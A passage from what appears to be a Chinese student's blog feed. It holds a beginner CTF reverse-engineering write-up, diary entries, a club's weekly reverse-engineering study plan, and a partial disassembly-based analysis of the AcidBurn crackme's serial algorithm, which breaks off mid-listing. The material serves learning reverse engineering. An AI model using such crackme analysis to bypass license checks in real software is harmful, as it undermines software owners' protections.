class="built_in">ax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401038</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040103D</span>                 <span class="keyword">push</span>    offset asc_413E60 <span class="comment">; "这是一道很可爱很简单的逆向题呦\n"</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401042</span>                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401047</span>                 <span class="keyword">push</span>    offset aFlag    <span class="comment">; "输入flag吧:"</span></span><br><span class="line"><span class="symbol">.text:</span>0040104C                 <span class="keyword">call</span>    _printf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401051</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401054</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401055</span>                 <span class="keyword">push</span>    offset aS       <span class="comment">; "%s"</span></span><br><span class="line"><span class="symbol">.text:</span>0040105A                 <span class="keyword">call</span>    _scanf</span><br><span class="line"><span class="symbol">.text:</span>0040105F                 <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">14h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401062</span>                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_24]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401065</span>                 <span class="keyword">lea</span>     <span class="built_in">ecx</span>, [<span class="built_in">ebp</span>+var_44]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span> loc_401068:                             <span class="comment">; CODE XREF: _main+82↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401068</span>                 <span class="keyword">mov</span>     <span class="built_in">dl</span>, [<span class="built_in">ecx</span>]</span><br><span class="line"><span class="symbol">.text:</span>0040106A                 <span class="keyword">cmp</span>     <span class="built_in">dl</span>, [<span class="built_in">eax</span>]</span><br><span class="line"><span class="symbol">.text:</span>0040106C                 <span class="keyword">jnz</span>     short loc_401088</span><br><span class="line"><span class="symbol">.text:</span>0040106E                 <span class="keyword">test</span>    <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401070</span>                 <span class="keyword">jz</span>      short loc_401084</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401072</span>                 <span class="keyword">mov</span>     <span class="built_in">dl</span>, [<span class="built_in">ecx</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401075</span>                 <span class="keyword">cmp</span>     <span class="built_in">dl</span>, [<span class="built_in">eax</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401078</span>                 <span class="keyword">jnz</span>     short loc_401088</span><br><span class="line"><span class="symbol">.text:</span>0040107A                 <span class="keyword">add</span>     <span class="built_in">ecx</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0040107D</span>                 <span class="keyword">add</span>     <span class="built_in">eax</span>, <span class="number">2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401080</span>                 <span class="keyword">test</span>    <span class="built_in">dl</span>, <span class="built_in">dl</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00401082</span>                 <span class="keyword">jnz</span>     short loc_401068</span><br></pre></td></tr></table></figure><p>在401010处可以看到有个movdqu指令，网上查了一下，这个指令是用来在未对齐的内存位置中移入/移出双四字，xmm0这个寄存器也没接触过，百度一下了解了XMM寄存器是8个128位独立寄存器。双击查看内容可以看到这个就是flag了。也就是这个程序初始化变量的时候直接把flag那个变量赋值了，果然是很简单的逆向题……</p><p>反编译验证一下推测：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int128 v5; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+10h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+18h] [ebp-2Ch]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [esp+1Ch] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [esp+20h] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  _mm_storeu_si128((__m128i *)&amp;v5, _mm_loadu_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_413E34));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = qword_413E44;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"欢迎来到DUTCTF呦\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"这是一道很可爱很简单的逆向题呦\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"输入flag吧:"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, &amp;v9);</span><br><span class="line">  v3 = <span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v5, &amp;v9);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    v3 = -(v3 &lt; <span class="number">0</span>) | <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">printf</span>(aFlag_0);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_413E90);</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，v6就是flag。</p>]]></content>
      
      
      <categories>
          
          <category> 玩安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190427</title>
      <link href="/2019/04/27/20190427/"/>
      <url>/2019/04/27/20190427/</url>
      
        <content type="html"><![CDATA[<p>今天拉着同学和两位学长陪华为杭研所的面试官吃了顿饭，期间说了很多有用的东西，而且明天不出意外的话他就是学长的面试官2333。</p><p>席间也问了一下关于996的事情，面试官没有直接回答，而是说不会经常通宵23333。</p><p>又没学习逆向，明天写一些攻防世界的WP，攻防世界找的各个CTF的题还是挺适合入门的，而且攻防世界前一阵有更新，还没体验过。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190426</title>
      <link href="/2019/04/26/20190426/"/>
      <url>/2019/04/26/20190426/</url>
      
        <content type="html"><![CDATA[<p>今天有学长找我，说是有另一个学长要找我聊聊，结果是想让我参加华为杭州研究所的实习……没办法只能拒绝，一是准备考研，无心立即找工作，二是能力被高估了，学长是听说我做pwn方向来找的我，而我自己清楚在pwn上面投入不足，产出更是没有。挺遗憾的，其实我是想在有时间的情况下出去实习锻炼锻炼的，可惜大二时候学校不会给这个机会。</p><p>前一阵玩pwn，看了各种堆的利用，到头来自己一道题的脚本都写不出来。逆向分析不到位，ROP不会构造，加上pwnlib不熟练，导致我暂时放弃了pwn，开始专注于逆向了。</p><p>羡慕学校信安专业17级的kirin-say师傅，很早就开始搞逆向了，现在在chamd5打pwn，只希望自己在大三上结束之前可以有一定基础，最起码不要再只能做出来比赛的签到题了……国赛捡漏做了第一天的逆向，GO语言一脸懵逼，全靠夜影师傅博客带（虽然最后没用上博客里的知识……）。<br>UML大作业要画十几个图，枯了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第五空间逆向任务</title>
      <link href="/2019/04/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%80%86%E5%90%91%E4%BB%BB%E5%8A%A1/"/>
      <url>/2019/04/26/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%80%86%E5%90%91%E4%BB%BB%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本任务拟定从4月20日起执行，任务周期为周日至下一周的周六上午，任务完成过程需要有详细的笔记记述，任务考察方式为验收笔记内容。任务发布拟定于每周周六下午或周日上午。每次任务发布会连带发布下一周任务内容，本周时间足够可以提前准备下周内容。</p></blockquote><blockquote><p>本文持续更新，后续任务亦将在此文章中更新，关于任务内容产生的任何问题，各位同学请在俱乐部群联系我。<br>上交的笔记推荐使用markdown进行排版，可以上交.md文件或.html文件，<strong><a href="https://www.appinn.com/markdown/" target="_blank" rel="noopener">给个markdown学习的传送门</a></strong></p></blockquote><hr><h2 id="第一周-4-21-4-27"><a href="#第一周-4-21-4-27" class="headerlink" title="第一周 4/21 - 4/27"></a>第一周 4/21 - 4/27</h2><blockquote><p>本周任务目的为熟练掌握编程语言，涉及结果展示的内容截图保存，代码直接复制粘贴。</p><blockquote><p>1、2、3、4为必做内容，其余为额外选做内容。</p></blockquote></blockquote><ol><li>学习并掌握C语言基础内容，包括：变量类型、运算符、条件语句、循环语句、数组、函数、指针等功能，了解C语言中二进制、八进制、十六进制数的表示与运算，掌握位与、位或、位异或、位取反操作。学习异或加密与解密方式。</li><li>学习C语言从源代码到二进制可执行文件（*.exe文件）的处理过程，不要求掌握其技术实现，重在知晓流程。</li><li>使用C实现一个函数，该函数接收一个数组指针作为参数，并利用指针遍历打印数组元素的地址以及数组元素的值。函数实现后，在main函数中提供样例进行函数功能展示。</li><li>使用任意编程语言实现异或加密，用户输入一串数据，以及一串密钥，程序将数据与密钥进行异或运算加密为密文并打印。</li><li>搭建Linux虚拟机（推荐使用Ubuntu系统，14、16、18版本均可），学习Linux基本操作，在Linux环境下使用gcc编译要求3中实现的内容并运行。</li><li>学习Python语言基础内容，要求同1，python无指针，故不需掌握，Python的面向对象编程部分也不需要掌握。</li></ol><p>参考：</p><ol><li><a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu 18.04.2镜像下载</a></li><li><a href="https://my.vmware.com/cn/web/vmware/info/slug/desktop_end_user_computing/vmware_workstation_pro/15_0" target="_blank" rel="noopener">VMware虚拟机程序下载</a></li><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">Python基础教程</a></li></ol><hr><h2 id="第二周-4-28-5-4"><a href="#第二周-4-28-5-4" class="headerlink" title="第二周 4/28 - 5/4"></a>第二周 4/28 - 5/4</h2><blockquote><p>任务目的为了解汇编语言，难度较大，故分两周完成。</p><blockquote><p>1、2、3为必做内容。</p></blockquote></blockquote><ol><li>掌握机器语言、汇编语言、高级语言（如C语言）的关系，了解CPU、寄存器、内存之间的关系，对计算机执行程序的过程有一个概括的认识。</li><li>掌握8086CPU中各个寄存器的作用，掌握汇编语言中访问变量的方式（寻址方式）。</li><li>掌握程序中的数据段、代码段、栈段各自的作用。</li></ol><p>参考教材：</p><ul><li><a href="《汇编语言第3版》王爽著.pdf" target="_blank">汇编教材下载（可以去大服的书店找找，可能会有二手）</a></li><li><a href="汇编金手指.zip" target="_blank">汇编金手指–汇编指令查询</a><hr></li></ul><h2 id="第三周-5-5-5-11"><a href="#第三周-5-5-5-11" class="headerlink" title="第三周 5/5 - 5/11"></a>第三周 5/5 - 5/11</h2><blockquote><p>本周继续进行汇编语言的学习。</p><blockquote><p>1、2、3为必做，4选做。</p></blockquote></blockquote><ol><li>掌握汇编的流程控制，循环。</li><li>掌握标志寄存器、call、ret指令。</li><li>重点掌握函数调用栈。</li><li>安装windows xp sp3虚拟机，在xp环境下进行汇编语言教材中的实验。</li></ol><h2 id="第四周-5-12-5-18"><a href="#第四周-5-12-5-18" class="headerlink" title="第四周 5/12 - 5/18"></a>第四周 5/12 - 5/18</h2><blockquote><p>本周开始学习分析和调试。</p><blockquote><p>1、2、3为必做，4选做。</p></blockquote></blockquote><ol><li>学习使用Ollydbg或x64dbg对程序进行动态调试分析。</li><li>学习使用IDA pro对程序进行静态分析。</li><li>分析一个简单的程序，下载传送门<a href="a.exe" title="可以算是一道ctf题吧(大概)">在这里</a>，分析此程序（不论静态或动态，分析出来即可，必须是反汇编分析，不能是反编译分析），分析出程序中的几个函数以及函数功能，在笔记中记清楚分析内容，找出程序中的flag。</li><li>修改3中程序，使其不会打印出”Try to kill me!”，并且不影响程序其他部分，在笔记中说明你patch的部分，不必上交patch后的程序。</li></ol><h2 id="第五周-5-26-6-1"><a href="#第五周-5-26-6-1" class="headerlink" title="第五周 5/26 - 6/1"></a>第五周 5/26 - 6/1</h2><blockquote><p>中间休息了一周用于复习以前的内容。<br>本周开始，难度将加大，任务以CTF题目方式放出，做题时不可网上查答案，有问题需要在群里题问。</p></blockquote><p>本周起的所有题目，都使用<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">攻防世界</a>的题库。无论题目做出与否都需要写题解。再次强调，做题期间不可直接搜索题解，可以搜索解题的相关技术。做题时涉及的Linux基础、gdb使用、python基础我会找时间线下说，或者我在群里解答。解题时遇到思路上的问题，在群里进行讨论。</p>]]></content>
      
      
      <categories>
          
          <category> 说个正事 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第五空间 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190425</title>
      <link href="/2019/04/26/20190425/"/>
      <url>/2019/04/26/20190425/</url>
      
        <content type="html"><![CDATA[<p>昨天看权游忘记写，今天补上。</p><p>看了密码学书的第一章，学习了凯撒密码和仿射加密，读书笔记还没有写，等着之后补上。</p><p>还看了自我修养前两章，虽然第一章属于基础知识的部分，但是看了第一章居然把这学期操作系统没太学明白的内容看明白了2333，确实是一本好书。</p><p>整理一下欠账，以及需要长期进行的事项：</p><ul><li>第五空间任务发布及验收打分</li><li>韩语</li><li>哨笛</li><li>七月前把自我修养刷一遍</li><li>买一本CSAPP，暑期实习前刷一遍</li><li>把第五空间的任务发布改到博客上（引流233</li><li>操作系统实验…</li><li>一周三道左右（最少一道）逆向题，做题量实在太少了</li><li>整理出更多的欠账……</li></ul>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20190424</title>
      <link href="/2019/04/24/20190424/"/>
      <url>/2019/04/24/20190424/</url>
      
        <content type="html"><![CDATA[<p>听了个考研讲座，本来以为九点回来还能学点东西，结果讲了两小时送了一小时，学习计划取消……</p><p>今天新开了运筹学的课，这个课主要是讲一些规划的算法，以及数学模型的建模方面的知识，感觉听听很有好处。</p><p>程序员的自我修养、龙书、深入浅出密码学到货，看了自我修养的前两章，周末有时间记一下笔记~</p><p>讲座上说本部的复试考CSAPP，看来还是要剁手买CSAPP了，虽然手上有一本英文版，但是根本没时间翻译啊……英语阅读起来比中文慢太多了。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AcidBurn分析</title>
      <link href="/2019/04/23/AcidBurn%E5%88%86%E6%9E%90/"/>
      <url>/2019/04/23/AcidBurn%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="AcidBurn.exe"><strong>程序下载</strong></a></p><p>AcidBurn的爆破、查找key的解法就不再记录了，十分基础。这篇主要记录程序的注册算法，即下图所示窗口。</p><p><img src="/2019/04/23/AcidBurn分析/1.png" alt="1.png"></p><p>开始根据错误提示信息（如下图）搜索字符串，反查字符串调用。</p><p><img src="/2019/04/23/AcidBurn分析/2.png" alt="2.png"></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0042FA3B | 8B <span class="number">45</span> EC                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">14</span>]           |</span><br><span class="line">0042FA3E | 0F B6 <span class="number">40</span> <span class="number">02</span>              | <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">2</span>]           |</span><br><span class="line">0042FA42 | 6B C0 0E                 | <span class="keyword">imul</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>,E                          |</span><br><span class="line">0042FA45 | <span class="number">03</span> F0                    | <span class="keyword">add</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                             |</span><br><span class="line">0042FA47 | <span class="number">89</span> <span class="number">35</span> <span class="number">58</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431758</span>],<span class="built_in">esi</span>           |</span><br><span class="line">0042FA4D | A1 6C <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[43176C]           |</span><br><span class="line">0042FA52 | E8 D9 6E FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">406930</span>                        |</span><br><span class="line">0042FA57 | <span class="number">83</span> F8 <span class="number">04</span>                 | <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="number">4</span>                               |</span><br><span class="line">0042FA5A | <span class="number">7D</span> <span class="number">1D</span>                    | <span class="keyword">jge</span> 去除弹窗.42FA79                         |</span><br></pre></td></tr></table></figure><p>可以看到42fa57处将eax的值与4进行了比较，向上找，<code>call 406930</code>之后eax的值变成了6（输入为123456），猜测406930会计算出输入的name字符串长度，改变name为123456789，调试发现再次执行到42fa57时，eax变成了9，基本证实了关于406930的功能猜想。再回来看<code>cmp eax,4</code>，和下一行的jge，联系jge跳到的部分的内容，得出这里和4比较的原因是检查name的长度是否小于四，小于四就不再计算序列号，直接提示错误。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0042FA5C | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                  |</span><br><span class="line">0042FA5E | B9 <span class="number">74</span> FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">ecx</span>,去除弹窗.42FB74                     | 42FB74:<span class="string">"Try Again!"</span></span><br><span class="line">0042FA63 | BA <span class="number">80</span> FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FB80                     | <span class="built_in">edx</span>:<span class="string">"|諦"</span>, 42FB80:<span class="string">"Sorry , The serial is incorect !"</span></span><br><span class="line">0042FA68 | A1 <span class="number">48</span> 0A <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[430A48]           |</span><br><span class="line">0042FA6D | 8B <span class="number">00</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]              |</span><br><span class="line">0042FA6F | E8 FC A6 FF FF           | <span class="keyword">call</span> 去除弹窗.42A170                        |</span><br><span class="line">0042FA74 | E9 BE <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">jmp</span> 去除弹窗.42FB37                         |</span><br><span class="line">0042FA79 | <span class="number">8D</span> <span class="number">55</span> F0                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FA7C | 8B <span class="number">83</span> DC <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+1DC]          | [<span class="built_in">ebx</span>+1DC]:<span class="string">"\\癇"</span></span><br><span class="line">0042FA82 | E8 D1 AF FE FF           | <span class="keyword">call</span> 去除弹窗.41AA58                        |</span><br><span class="line">0042FA87 | 8B <span class="number">45</span> F0                 | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">10</span>]           | [<span class="built_in">ebp</span>-<span class="number">10</span>]:<span class="string">"123456789"</span></span><br><span class="line">0042FA8A | 0F B6 <span class="number">00</span>                 | <span class="keyword">movzx</span> <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>]             |</span><br><span class="line">0042FA8D | F7 <span class="number">2D</span> <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">imul</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]              | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA93 | A3 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>],<span class="built_in">eax</span>           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA98 | A1 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FA9D | <span class="number">01</span> <span class="number">05</span> <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>        | <span class="keyword">add</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>],<span class="built_in">eax</span>           | <span class="number">00431750</span>:L<span class="string">")"</span></span><br><span class="line">0042FAA3 | <span class="number">8D</span> <span class="number">45</span> FC                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">4</span>]            |</span><br><span class="line">0042FAA6 | BA AC FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FBAC                     | <span class="built_in">edx</span>:<span class="string">"|諦"</span>, 42FBAC:<span class="string">"CW"</span>�</span><br><span class="line">0042FAAB | E8 <span class="number">58</span> 3C FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">403708</span>                        |</span><br><span class="line">0042FAB0 | <span class="number">8D</span> <span class="number">45</span> F8                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">8</span>]            |</span><br><span class="line">0042FAB3 | BA B8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,去除弹窗.42FBB8                     | <span class="built_in">edx</span>:<span class="string">"|諦"</span>, 42FBB8:<span class="string">"CRACKED"</span></span><br><span class="line">0042FAB8 | E8 4B 3C FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">403708</span>                        |</span><br></pre></td></tr></table></figure><p>接着往下看，jge跳转到42fa79处，到42fa87处eax指向了name字符串，接着读取了name的第一个字符（注意是字符’1’，这里值为0x31），接着与<code>ds:[431750]</code>值相乘（值为0x29），再把结果与结果相加（乘以2），进入42faa6，把’CW’作为参数传入403708。</p><p>这里的403808实际上是拼接字符串的函数，以前把这个当作了加密序列号的主要函数，结果F7进去之后懵了，看了夜影师傅的博客才恍然大悟（<a href="https://blog.csdn.net/whklhhhh/article/details/72700446" target="_blank" rel="noopener">传送门</a>）。</p><p>继续向下走，</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0042FABD | FF <span class="number">75</span> FC                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">4</span>]               | [<span class="built_in">ebp</span>-<span class="number">4</span>]:<span class="string">"CW"</span></span><br><span class="line">0042FAC0 | <span class="number">68</span> C8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">push</span> 去除弹窗.42FBC8                        | 42FBC8:L<span class="string">"-"</span></span><br><span class="line">0042FAC5 | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]           |</span><br><span class="line">0042FAC8 | A1 <span class="number">50</span> <span class="number">17</span> <span class="number">43</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="number">431750</span>]           | <span class="built_in">eax</span>:<span class="string">"耕B"</span>==&amp;<span class="string">"CRACKED"</span></span><br><span class="line">0042FACD | E8 <span class="number">46</span> 6C FD FF           | <span class="keyword">call</span> 去除弹窗.<span class="number">406718</span>                        |</span><br><span class="line">0042FAD2 | FF <span class="number">75</span> E8                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]              |</span><br><span class="line">0042FAD5 | <span class="number">68</span> C8 FB <span class="number">42</span> <span class="number">00</span>           | <span class="keyword">push</span> 去除弹窗.42FBC8                        | 42FBC8:L<span class="string">"-"</span></span><br><span class="line">0042FADA | FF <span class="number">75</span> F8                 | <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">8</span>]               | [<span class="built_in">ebp</span>-<span class="number">8</span>]:<span class="string">"CRACKED"</span></span><br><span class="line">0042<span class="keyword">FADD</span> | <span class="number">8D</span> <span class="number">45</span> F4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C]            |</span><br><span class="line">0042FAE0 | BA <span class="number">05</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="number">5</span>                               |</span><br><span class="line">0042FAE5 | E8 C2 3E FD FF           | <span class="keyword">call</span> 去除弹窗.4039AC                        |</span><br><span class="line">0042FAEA | <span class="number">8D</span> <span class="number">55</span> F0                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span 